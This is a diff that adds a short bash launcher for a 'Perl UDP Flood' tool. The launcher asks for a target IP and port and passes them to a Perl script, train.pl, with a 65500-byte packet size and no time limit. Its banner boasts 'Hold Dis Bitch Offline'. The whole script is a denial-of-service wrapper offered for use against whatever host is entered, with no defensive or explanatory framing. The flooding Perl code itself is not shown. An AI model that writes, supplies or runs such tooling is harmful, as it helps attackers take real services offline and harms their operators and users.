@@ -1,0 +1,12 @@
+#!/bin/bash
+clear
+echo " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo " ~~~  Perl UDP Flood :   Coded By Realtalk  ~~~ "
+echo " ~~          Hold Dis Bitch Offline          ~~ "
+echo " ~~~~~~~~~~~  CTRL-C To Stop Flood  ~~~~~~~~~~~ "
+echo " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
+echo "Enter IP :"
+read ip
+echo "Enter Port :"
+read port
+./train.pl $ip $port 65500 0
